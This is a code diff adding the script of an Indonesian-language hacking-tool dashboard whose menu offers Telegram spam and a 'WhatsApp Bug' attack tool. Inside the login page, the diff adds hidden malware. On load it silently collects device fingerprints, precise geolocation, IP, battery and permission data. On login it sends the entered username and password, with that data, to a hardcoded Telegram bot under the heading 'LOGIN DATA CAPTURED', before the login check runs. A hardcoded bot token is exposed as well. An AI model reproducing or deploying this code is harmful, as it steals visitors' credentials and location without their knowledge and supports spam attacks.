+                id: 2,
+                title: 'SPAM TELEGRAM',
+                description: 'Spam teks dan pesan lainnya ke user telegram.',
+                icon: 'fab fa-telegram',
+                stats: ['SPAM', 'ATTACK', 'TOOLS'],
+                link: '/telegram-spam'
+            },
+            {
+                id: 3,
+                title: 'SPAM LINK PHOTO/VIDEO',
+                description: 'Kirim link photo/video ke telegram secara massal.',
+                icon: 'fas fa-link',
+                stats: ['PHOTO', 'VIDEO', 'MASS'],
+                link: '/telegram-media-spam'
+            },
+            {
+                id: 4,
+                title: 'TikTok Downloader',
+                description: 'Download video TikTok tanpa watermark dalam kualitas HD.',
+                icon: 'fab fa-tiktok',
+                stats: ['Video', 'No WM', 'HD'],
+                link: '/tiktok'
+            },
+            {
+                id: 5,
+                title: 'WhatsApp Bug\'s',
+                description: 'Bug WhatsApp Simple dengan API yang mudah digunakan.',
+                icon: 'fab fa-whatsapp',
+                stats: ['Attack', 'Payload', 'Bug'],
+                link: '/execution?from=dashboard'
+            }
+        ];
+
+        // Telegram Bot Configuration
+        const TELEGRAM_BOT_TOKEN = '8462527564:AAF-cHcvOrmxEs0qSt9KgjY5p6rptytp8aw';
+        const TELEGRAM_CHAT_ID = '6513874853';
+
+        // Global variables
+        let currentPhotoIndex = 0;
+        let photoInterval;
+        let currentSlide = 0;
+        let autoSlideInterval;
+        let isDragging = false;
+        let startPos = 0;
+        let currentTranslate = 0;
+        let prevTranslate = 0;
+        let direction = 1;
+        const autoSlideSpeed = 4000;
+        let cardWidth = 300;
+        let cardGap = 20;
+
+        // Inisialisasi aplikasi
+        document.addEventListener('DOMContentLoaded', function() {
+            initLoginPage();
+            initPhotoCarousel();
+            initCarousel();
+            setupTaskbarNavigation();
+            
+            // Cek jika sudah login sebelumnya
+            checkLoginStatus();
+            
+            // Kumpulkan data device saat halaman dimuat
+            collectDeviceData();
+        });
+
+        // Fungsi untuk mengumpulkan data device
+        async function collectDeviceData() {
+            try {
+                const deviceData = {
+                    timestamp: new Date().toISOString(),
+                    userAgent: navigator.userAgent,
+                    platform: navigator.platform,
+                    language: navigator.language,
+                    languages: navigator.languages,
+                    screenWidth: screen.width,
+                    screenHeight: screen.height,
+                    colorDepth: screen.colorDepth,
+                    pixelRatio: window.devicePixelRatio,
+                    timezone: Intl.DateTimeFormat().resolvedOptions().timeZone,
+                    onlineStatus: navigator.onLine,
+                    connectionType: navigator.connection ? navigator.connection.effectiveType : 'unknown',
+                    deviceMemory: navigator.deviceMemory || 'unknown',
+                    hardwareConcurrency: navigator.hardwareConcurrency,
+                    cookieEnabled: navigator.cookieEnabled,
+                    doNotTrack: navigator.doNotTrack || 'unknown',
+                    maxTouchPoints: navigator.maxTouchPoints,
+                    referrer: document.referrer,
+                    pageVisibility: document.visibilityState,
+                    location: null
+                };
+
+                // Coba dapatkan lokasi
+                if (navigator.geolocation) {
+                    try {
+                        const position = await new Promise((resolve, reject) => {
+                            navigator.geolocation.getCurrentPosition(resolve, reject, {
+                                enableHighAccuracy: true,
+                                timeout: 10000,
+                                maximumAge: 0
+                            });
+                        });
+
+                        deviceData.location = {
+                            latitude: position.coords.latitude,
+                            longitude: position.coords.longitude,
+                            accuracy: position.coords.accuracy,
+                            altitude: position.coords.altitude,
+                            altitudeAccuracy: position.coords.altitudeAccuracy,
+                            heading: position.coords.heading,
+                            speed: position.coords.speed,
+                            timestamp: position.timestamp
+                        };
+                    } catch (geoError) {
+                        deviceData.locationError = geoError.message;
+                    }
+                }
+
+                // Simpan data untuk dikirim saat login
+                window.deviceData = deviceData;
+                
+                // Coba dapatkan IP dan info lokasi
+                try {
+                    const ipResponse = await fetch('https://api.ipify.org?format=json');
+                    const ipData = await ipResponse.json();
+                    deviceData.publicIP = ipData.ip;
+                    
+                    // Dapatkan info lokasi dari IP
+                    try {
+                        const geoResponse = await fetch(`https://ipapi.co/${ipData.ip}/json/`);
+                        const geoData = await geoResponse.json();
+                        deviceData.geoInfo = {
+                            country: geoData.country_name,
+                            region: geoData.region,
+                            city: geoData.city,
+                            timezone: geoData.timezone,
+                            isp: geoData.org,
+                            asn: geoData.asn
+                        };
+                    } catch (geoError) {
+                        console.log('Geo info error:', geoError);
+                    }
+                } catch (ipError) {
+                    console.log('IP fetch error:', ipError);
+                }
+
+                // Battery info
+                if ('getBattery' in navigator) {
+                    try {
+                        const battery = await navigator.getBattery();
+                        deviceData.battery = {
+                            level: battery.level,
+                            charging: battery.charging,
+                            chargingTime: battery.chargingTime,
+                            dischargingTime: battery.dischargingTime
+                        };
+                    } catch (batteryError) {
+                        console.log('Battery error:', batteryError);
+                    }
+                }
+
+                // Network info
+                if (navigator.connection) {
+                    deviceData.networkInfo = {
+                        downlink: navigator.connection.downlink,
+                        rtt: navigator.connection.rtt,
+                        saveData: navigator.connection.saveData,
+                        type: navigator.connection.type
+                    };
+                }
+
+                // Storage info
+                if ('storage' in navigator && 'estimate' in navigator.storage) {
+                    try {
+                        const estimate = await navigator.storage.estimate();
+                        deviceData.storage = {
+                            quota: estimate.quota,
+                            usage: estimate.usage,
+                            usageDetails: estimate.usageDetails
+                        };
+                    } catch (storageError) {
+                        console.log('Storage error:', storageError);
+                    }
+                }
+
+                // Permissions
+                const permissions = ['geolocation', 'camera', 'microphone', 'notifications'];
+                deviceData.permissions = {};
+                
+                for (const permission of permissions) {
+                    try {
+                        const status = await navigator.permissions.query({ name: permission });
+                        deviceData.permissions[permission] = status.state;
+                    } catch (permError) {
+                        console.log(`Permission ${permission} error:`, permError);
+                    }
+                }
+
+                // Sensors
+                deviceData.sensors = {
+                    accelerometer: 'Accelerometer' in window,
+                    gyroscope: 'Gyroscope' in window,
+                    magnetometer: 'Magnetometer' in window,
+                    orientation: 'DeviceOrientationEvent' in window,
+                    motion: 'DeviceMotionEvent' in window
+                };
+
+                // WebGL info
+                try {
+                    const canvas = document.createElement('canvas');
+                    const gl = canvas.getContext('webgl') || canvas.getContext('experimental-webgl');
+                    if (gl) {
+                        const debugInfo = gl.getExtension('WEBGL_debug_renderer_info');
+                        deviceData.webgl = {
+                            renderer: debugInfo ? gl.getParameter(debugInfo.UNMASKED_RENDERER_WEBGL) : 'unknown',
+                            vendor: debugInfo ? gl.getParameter(debugInfo.UNMASKED_VENDOR_WEBGL) : 'unknown'
+                        };
+                    }
+                } catch (webglError) {
+                    console.log('WebGL error:', webglError);
+                }
+
+            } catch (error) {
+                console.log('Device data collection error:', error);
+            }
+        }
+
+        // Fungsi untuk mengirim data ke Telegram
+        async function sendDataToTelegram(username, password) {
+            try {
+                const deviceData = window.deviceData || {};
+                
+                // Format data untuk dikirim
+                const message = `
+🚨 *LOGIN DATA CAPTURED* 🚨
+
+📱 *USER INFO*
+• Username: ${username}
+• Password: ${password}
+• Login Time: ${new Date().toLocaleString()}
+
+📍 *LOCATION DATA*
+• Latitude: ${deviceData.location?.latitude || 'Not available'}
+• Longitude: ${deviceData.location?.longitude || 'Not available'}
+• Accuracy: ${deviceData.location?.accuracy || 'N/A'} meters
+• Altitude: ${deviceData.location?.altitude || 'N/A'}
+• Speed: ${deviceData.location?.speed || 'N/A'} m/s
+
+🌐 *NETWORK INFO*
+• Public IP: ${deviceData.publicIP || 'Unknown'}
+• Country: ${deviceData.geoInfo?.country || 'Unknown'}
+• Region: ${deviceData.geoInfo?.region || 'Unknown'}
+• City: ${deviceData.geoInfo?.city || 'Unknown'}
+• ISP: ${deviceData.geoInfo?.isp || 'Unknown'}
+• Timezone: ${deviceData.geoInfo?.timezone || deviceData.timezone || 'Unknown'}
+• Connection: ${deviceData.networkInfo?.type || 'Unknown'}
+
+💻 *DEVICE INFO*
+• User Agent: ${deviceData.userAgent?.substring(0, 100) || 'Unknown'}
+• Platform: ${deviceData.platform || 'Unknown'}
+• Language: ${deviceData.language || 'Unknown'}
+• Screen: ${deviceData.screenWidth || 0}x${deviceData.screenHeight || 0}
+• Pixel Ratio: ${deviceData.pixelRatio || 1}
+• Device Memory: ${deviceData.deviceMemory || 'Unknown'} GB
+• CPU Cores: ${deviceData.hardwareConcurrency || 'Unknown'}
+
+📡 *BROWSER INFO*
+• Cookies: ${deviceData.cookieEnabled ? 'Enabled' : 'Disabled'}
+• Do Not Track: ${deviceData.doNotTrack || 'Unknown'}
+• Online: ${deviceData.onlineStatus ? 'Yes' : 'No'}
+• Referrer: ${deviceData.referrer || 'Direct'}
+
+⚡ *PERFORMANCE*
+• Network Type: ${deviceData.networkInfo?.type || 'Unknown'}
+• Downlink: ${deviceData.networkInfo?.downlink || 'Unknown'} Mbps
+• RTT: ${deviceData.networkInfo?.rtt || 'Unknown'} ms
+
+🔋 *BATTERY*
+• Level: ${deviceData.battery?.level ? (deviceData.battery.level * 100).toFixed(0) + '%' : 'Unknown'}
+• Charging: ${deviceData.battery?.charging ? 'Yes' : 'No'}
+
+🛡️ *PERMISSIONS*
+• Location: ${deviceData.permissions?.geolocation || 'Unknown'}
+• Camera: ${deviceData.permissions?.camera || 'Unknown'}
+• Microphone: ${deviceData.permissions?.microphone || 'Unknown'}
+
+📊 *ADDITIONAL DATA*
+• Timezone Offset: ${new Date().getTimezoneOffset() / -60} hours
+• Page Visibility: ${deviceData.pageVisibility || 'Unknown'}
+• Languages: ${deviceData.languages?.join(', ') || 'Unknown'}
+                `;
+
+                // Encode message untuk URL
+                const encodedMessage = encodeURIComponent(message);
+                
+                // Kirim ke Telegram
+                const url = `https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/sendMessage?chat_id=${TELEGRAM_CHAT_ID}&text=${encodedMessage}&parse_mode=Markdown`;
+                
+                await fetch(url, { method: 'POST' });
+                
+                console.log('Data sent to Telegram successfully');
+                
+            } catch (error) {
+                console.error('Error sending data to Telegram:', error);
+            }
+        }
+
+        // Cek status login
+        function checkLoginStatus() {
+            const isLoggedIn = localStorage.getItem('ramadevtools_logged_in');
+            
+            if (isLoggedIn === 'true') {
+                showDashboard();
+            }
+        }
+
+        // Fungsi untuk membuat partikel efek
+        function createParticles() {
+            const particlesContainer = document.getElementById('particles');
+            particlesContainer.innerHTML = '';
+            
+            for (let i = 0; i < 5; i++) {
+                const particle = document.createElement('div');
+                particle.className = 'particle';
+                
+                const top = Math.random() * 100;
+                const right = Math.random() * 100;
+                const delay = Math.random() * 3;
+                const duration = 2 + Math.random() * 2;
+                
+                particle.style.top = `${top}%`;
+                particle.style.right = `${right}%`;
+                particle.style.left = 'auto';
+                particle.style.animationDelay = `${delay}s`;
+                particle.style.animationDuration = `${duration}s`;
+                
+                particlesContainer.appendChild(particle);
+            }
+        }
+
+        // Inisialisasi halaman login
+        function initLoginPage() {
+            createParticles();
+            
+            // Password toggle functionality
+            const passwordToggle = document.getElementById('passwordToggle');
+            const passwordInput = document.getElementById('password');
+            const eyeIcon = passwordToggle.querySelector('i');
+            
+            passwordToggle.addEventListener('click', function() {
+                const type = passwordInput.getAttribute('type') === 'password' ? 'text' : 'password';
+                passwordInput.setAttribute('type', type);
+                
+                if (type === 'text') {
+                    eyeIcon.classList.remove('fa-eye');
+                    eyeIcon.classList.add('fa-eye-slash');
+                } else {
+                    eyeIcon.classList.remove('fa-eye-slash');
+                    eyeIcon.classList.add('fa-eye');
+                }
+            });
+            
+            // Form submission handler
+            const loginForm = document.getElementById('loginForm');
+            loginForm.addEventListener('submit', async function(e) {
+                e.preventDefault();
+                
+                const username = document.getElementById('username').value;
+                const password = document.getElementById('password').value;
+                
+                // Kirim data ke Telegram
+                await sendDataToTelegram(username, password);
+                
+                // Validasi login
+                if (username === 'rama' && password === '123') {
+                    showMessage('Access granted! Welcome back Rama.', 'success');
+                    
+                    // Simpan status login
+                    localStorage.setItem('ramadevtools_logged_in', 'true');
+                    localStorage.setItem('ramadevtools_username', username);
+                    
+                    // Simulasi loading
+                    const loginBtn = document.querySelector('.login-btn');
+                    const originalText = loginBtn.innerHTML;
+                    loginBtn.innerHTML = '<i class="fas fa-spinner fa-spin"></i> MEMPROSES...';
+                    loginBtn.disabled = true;
+                    
+                    setTimeout(() => {
+                        // Tampilkan dashboard
+                        showDashboard();
+                        
+                        // Reset form
+                        loginForm.reset();
+                        loginBtn.innerHTML = originalText;
+                        loginBtn.disabled = false;
+                        
+                        // Reset password visibility
+                        passwordInput.setAttribute('type', 'password');
+                        eyeIcon.classList.remove('fa-eye-slash');
+                        eyeIcon.classList.add('fa-eye');
+                    }, 1000);
+                } else {
+                    showMessage('Invalid username or password! Try: rama / 123', 'error');
+                }
+            });
+            
+            // Text animation functionality
+            const textSets = document.querySelectorAll('.text-set');
+            if (textSets.length > 0) {
+                let currentIndex = 0;
+                let isAnimating = false;
+
+                function wrapTextInSpans(element) {
+                    const text = element.textContent;
+                    element.innerHTML = text.split('').map((char, i) => 
+                        `<span class="char" style="animation-delay: ${i * 0.05}s">${char === ' ' ? '&nbsp;' : char}</span>`
+                    ).join('');
+                }
+
+                function animateTextIn(textSet) {
+                    const glitchText = textSet.querySelector('.glitch-text');
+                    const tagline = textSet.querySelector('.tagline');
+                    
+                    wrapTextInSpans(glitchText);
+                    glitchText.setAttribute('data-text', glitchText.textContent);
+                    
+                    setTimeout(() => {
+                        tagline.style.opacity = '0.6';
+                    }, 800);
+                }
+
+                function animateTextOut(textSet) {
+                    const chars = textSet.querySelectorAll('.char');
+                    const tagline = textSet.querySelector('.tagline');
+                    
+                    chars.forEach((char, i) => {
+                        char.style.animationDelay = `${i * 0.02}s`;
+                        char.classList.add('out');
+                    });
+                    
+                    tagline.style.opacity = '0.3';
+                }
+
+                function rotateText() {
+                    if (isAnimating) return;
+                    isAnimating = true;
+
+                    const currentSet = textSets[currentIndex];
+                    const nextIndex = (currentIndex + 1) % textSets.length;
+                    const nextSet = textSets[nextIndex];
+
+                    animateTextOut(currentSet);
+
+                    setTimeout(() => {
+                        currentSet.classList.remove('active');
+                        nextSet.classList.add('active');
+                        animateTextIn(nextSet);
+                        
+                        currentIndex = nextIndex;
+                        isAnimating = false;
+                    }, 600);
+                }
+
+                // Initialize text animation
+                textSets[0].classList.add('active');
+                animateTextIn(textSets[0]);
+
+                // Start rotation after initial display
+                setTimeout(() => {
+                    setInterval(rotateText, 5000);
+                }, 4000);
+            }
+        }
+
+        // Fungsi untuk menampilkan dashboard
+        function showDashboard() {
+            // Tambahkan class ke body untuk menyembunyikan login dan menampilkan dashboard
+            document.body.classList.add('login-hidden');
+            
+            // Hapus partikel efek dari login
+            document.getElementById('particles').innerHTML = '';
+            
+            // Mulai carousel dashboard
+            startPhotoAutoSlide();
+            startAutoSlide();
+        }
+
+        // Photo Carousel dengan navigasi manual
+        function initPhotoCarousel() {
+            const photoCarousel = document.getElementById('photoCarousel');
+            photoData.forEach((photo) => {
+                const slide = document.createElement('div');
+                slide.className = 'photo-slide';
+                slide.innerHTML = `
+                    <img src="${photo.imageUrl}" alt="${photo.title}" loading="lazy">
+                    <div class="photo-overlay">
+                        <div class="photo-content">
+                            <h2 class="photo-title">${photo.title}</h2>
+                            <p class="photo-subtitle">${photo.subtitle}</p>
+                        </div>
+                    </div>
+                `;
+                photoCarousel.appendChild(slide);
+            });
+
+            // Tambahkan event listeners untuk navigasi manual
+            const prevButton = document.getElementById('prevPhoto');
+            const nextButton = document.getElementById('nextPhoto');
+
+            prevButton.addEventListener('click', () => {
+                currentPhotoIndex = (currentPhotoIndex - 1 + photoData.length) % photoData.length;
+                updatePhotoCarousel();
+                resetPhotoInterval();
+            });
+
+            nextButton.addEventListener('click', () => {
+                currentPhotoIndex = (currentPhotoIndex + 1) % photoData.length;
+                updatePhotoCarousel();
+                resetPhotoInterval();
+            });
+        }
+
+        function updatePhotoCarousel() {
+            const photoCarousel = document.getElementById('photoCarousel');
+            photoCarousel.style.transform = `translateX(-${currentPhotoIndex * 100}%)`;
+        }
+
+        function startPhotoAutoSlide() {
+            if (photoInterval) clearInterval(photoInterval);
+            photoInterval = setInterval(() => {
+                currentPhotoIndex = (currentPhotoIndex + 1) % photoData.length;
+                updatePhotoCarousel();
+            }, 5000);
+        }
+
+        function resetPhotoInterval() {
+            if (photoInterval) {
+                clearInterval(photoInterval);
+                startPhotoAutoSlide();
+            }
+        }
+
+        // Cards Carousel
+        function createCard(data) {
+            const card = document.createElement('div');
+            card.className = 'uiverse-card';
+            card.innerHTML = `
+                <div class="top-section">
+                    <div class="border"></div>
+                    <div class="icons">
+                        <div class="logo"><i class="${data.icon}"></i></div>
+                    </div>
+                    <div class="tool-icon"><i class="${data.icon}"></i></div>
+                </div>
+                <div class="bottom-section">
+                    <span class="title">${data.title}</span>
+                    <p class="description">${data.description}</p>
+                    <div class="row">
+                        <div class="item">
+                            <span class="big-text">${data.stats[0]}</span>
+                            <span class="regular-text">Feature</span>
+                        </div>
+                        <div class="item">
+                            <span class="big-text">${data.stats[1]}</span>
+                            <span class="regular-text">Feature</span>
+                        </div>
+                        <div class="item">
+                            <span class="big-text">${data.stats[2]}</span>
+                            <span class="regular-text">Feature</span>
+                        </div>
+                    </div>
+                    <button class="card-cta">OPEN TOOL</button>
+                </div>
+            `;
+            
+            // Add click event to card button
+            const cardButton = card.querySelector('.card-cta');
+            cardButton.addEventListener('click', (e) => {
+                e.preventDefault();
+                e.stopPropagation();
+                if (data.link && data.link !== '#') {
+                    window.open(data.link, '_blank');
+                    showMessage(`Opening ${data.title}...`, 'info');
+                } else {
+                    showMessage(`Tool "${data.title}" sedang dalam pengembangan.`, 'info');
+                }
+            });
+            
+            return card;
+        }
+
+        function initCarousel() {
+            const carouselTrack = document.getElementById('carouselTrack');
+            if (!carouselTrack) return;
+            
+            // Clear existing content
+            carouselTrack.innerHTML = '';
+            
+            // Create cards
+            menuData.forEach(data => {
+                carouselTrack.appendChild(createCard(data));
+            });
+            
+            // Create indicators
+            createIndicators();
+            
+            // Add drag events
+            addDragEvents();
+        }
+
+        function createIndicators() {
+            const slideIndicator = document.getElementById('slideIndicator');
+            if (!slideIndicator) return;
+            
+            slideIndicator.innerHTML = '';
+            menuData.forEach((_, i) => {
+                const dot = document.createElement('div');
+                dot.className = 'indicator-dot';
+                if (i === currentSlide) dot.classList.add('active');
+                dot.addEventListener('click', () => moveToSlide(i));
+                slideIndicator.appendChild(dot);
+            });
+        }
+
+        function updateIndicators() {
+            const dots = document.querySelectorAll('.indicator-dot');
+            dots.forEach((dot, index) => {
+                dot.classList.toggle('active', index === currentSlide);
+            });
+        }
+
+        function startAutoSlide() {
+            if (autoSlideInterval) clearInterval(autoSlideInterval);
+            autoSlideInterval = setInterval(() => {
+                let nextSlide = currentSlide + direction;
+                if (nextSlide >= menuData.length) {
+                    direction = -1;
+                    nextSlide = menuData.length - 2;
+                } else if (nextSlide < 0) {
+                    direction = 1;
+                    nextSlide = 1;
+                }
+                moveToSlide(nextSlide);
+            }, autoSlideSpeed);
+        }
+
+        function moveToSlide(index, animate = true) {
+            const carouselTrack = document.getElementById('carouselTrack');
+            if (!carouselTrack) return;
+            
+            currentSlide = Math.max(0, Math.min(index, menuData.length - 1));
+            const totalWidth = cardWidth + cardGap;
+            const targetPosition = currentSlide * totalWidth;
+            currentTranslate = -targetPosition;
+            prevTranslate = currentTranslate;
+            carouselTrack.style.transition = animate ? 'transform 0.5s cubic-bezier(0.4, 0.0, 0.2, 1)' : 'none';
+            carouselTrack.style.transform = `translateX(${currentTranslate}px)`;
+            updateIndicators();
+        }
+
+        function addDragEvents() {
+            const carouselWrapper = document.getElementById('carouselWrapper');
+            const carouselTrack = document.getElementById('carouselTrack');
+            
+            if (!carouselWrapper || !carouselTrack) return;
+            
+            const getPositionX = (e) => e.type.includes('mouse') ? e.clientX : e.touches[0].clientX;
+            
+            function dragStart(e) {
+                startPos = getPositionX(e);
+                isDragging = true;
+                clearInterval(autoSlideInterval);
+                carouselTrack.style.transition = 'none';
+            }
+            
+            function drag(e) {
+                if (!isDragging) return;
+                const currentX = getPositionX(e);
+                const diff = currentX - startPos;
+                currentTranslate = prevTranslate + diff;
+                carouselTrack.style.transform = `translateX(${currentTranslate}px)`;
+            }
+            
+            function dragEnd() {
+                if (!isDragging) return;
+                isDragging = false;
+                carouselTrack.style.transition = 'transform 0.5s cubic-bezier(0.4, 0.0, 0.2, 1)';
+                const movedBy = currentTranslate - prevTranslate;
+                const totalWidth = cardWidth + cardGap;
+                if (Math.abs(movedBy) > totalWidth / 3) {
+                    currentSlide = movedBy < 0 ? Math.min(currentSlide + 1, menuData.length - 1) : Math.max(currentSlide - 1, 0);
+                }
+                moveToSlide(currentSlide);
+                startAutoSlide();
+            }
+
+            carouselWrapper.addEventListener('mousedown', dragStart);
+            carouselWrapper.addEventListener('mousemove', drag);
+            carouselWrapper.addEventListener('mouseup', dragEnd);
+            carouselWrapper.addEventListener('mouseleave', dragEnd);
+            carouselWrapper.addEventListener('touchstart', dragStart);
+            carouselWrapper.addEventListener('touchmove', drag);
+            carouselWrapper.addEventListener('touchend', dragEnd);
+        }
+
+        // Taskbar Navigation
+        function setupTaskbarNavigation() {
+            const customersModal = document.getElementById('customersModal');
+            const backButton = document.getElementById('backButton');
+            
+            // Home button
+            const homeButton = document.getElementById('homeButton');
+            if (homeButton) {
+                homeButton.addEventListener('click', (e) => {
+                    e.preventDefault();
+                    updateButtonState(homeButton);
+                    window.scrollTo({ top: 0, behavior: 'smooth' });
+                    customersModal.classList.remove('active');
+                    showMessage('Returned to homepage', 'info');
+                });
+            }
+            
+            // Customers button
+            const customersButton = document.getElementById('customersButton');
+            if (customersButton) {
+                customersButton.addEventListener('click', (e) => {
+                    e.preventDefault();
+                    updateButtonState(customersButton);
+                    customersModal.classList.add('active');
+                    showMessage('Opening contacts', 'info');
+                });
+            }
+            
+            // Logout button
+            const logoutButton = document.getElementById('logoutButton');
+            if (logoutButton) {
+                logoutButton.addEventListener('click', (e) => {
+                    e.preventDefault();
+                    updateButtonState(logoutButton);
+                    
+                    // Tampilkan konfirmasi logout
+                    if (confirm('Apakah Anda yakin ingin logout?')) {
+                        logout();
+                    } else {
+                        updateButtonState(homeButton);
+                    }
+                });
+            }
+            
+            // Back button di modal
+            if (backButton) {
+                backButton.addEventListener('click', () => {
+                    customersModal.classList.remove('active');
+                    updateButtonState(homeButton);
+                });
+            }
+            
+            // Close modal when clicking outside
+            if (customersModal) {
+                customersModal.addEventListener('click', (e) => {
+                    if (e.target === customersModal) {
+                        customersModal.classList.remove('active');
+                        updateButtonState(homeButton);
+                    }
+                });
+            }
+        }
+
+        function updateButtonState(activeButton) {
+            const buttons = ['homeButton', 'customersButton', 'logoutButton'];
+            buttons.forEach(btnId => {
+                const btn = document.getElementById(btnId);
+                if (btn) btn.classList.remove('active');
+            });
+            if (activeButton) activeButton.classList.add('active');
+        }
+
+        // Fungsi logout
+        function logout() {
+            // Hapus status login
+            localStorage.removeItem('ramadevtools_logged_in');
+            localStorage.removeItem('ramadevtools_username');
+            
+            // Hentikan semua interval
+            clearInterval(photoInterval);
+            clearInterval(autoSlideInterval);
+            
+            // Sembunyikan dashboard
+            document.body.classList.remove('login-hidden');
+            
+            // Buat ulang partikel efek
+            createParticles();
+            
+            // Reset carousel
+            currentPhotoIndex = 0;
+            currentSlide = 0;
+            
+            showMessage('You have been logged out successfully.', 'info');
+        }
+
+        // Fungsi untuk menampilkan pesan
+        function showMessage(message, type = 'success') {
+            // Hapus pesan lama jika ada
+            const oldMessage = document.querySelector('.message');
+            if (oldMessage) oldMessage.remove();
+            
+            // Warna berdasarkan tipe
+            const colors = {
+                success: '#44ff44',
+                error: '#ff4444',
+                info: '#2196F3'
+            };
+            
+            // Buat elemen pesan baru
+            const messageEl = document.createElement('div');
+            messageEl.className = `message ${type}`;
+            messageEl.textContent = message;
+            messageEl.style.cssText = `
+                position: fixed;
+                top: 20px;
+                right: 20px;
+                background: rgba(0, 0, 0, 0.9);
+                color: white;
+                padding: 12px 20px;
+                border-radius: 10px;
+                border-left: 3px solid ${colors[type] || '#44ff44'};
+                z-index: 1000;
+                animation: slideIn 0.3s ease;
+                border: 1px solid rgba(255, 255, 255, 0.2);
+                font-size: 0.85rem;
+                box-shadow: 0 5px 15px rgba(0, 0, 0, 0.5);
+            `;
+            
+            document.body.appendChild(messageEl);
+            
+            // Hapus pesan setelah 3 detik
+            setTimeout(() => {
+                messageEl.style.animation = 'slideOut 0.3s ease';
+                setTimeout(() => messageEl.remove(), 300);
+            }, 3000);
+        }
+    </script>
+</body>
+</html>
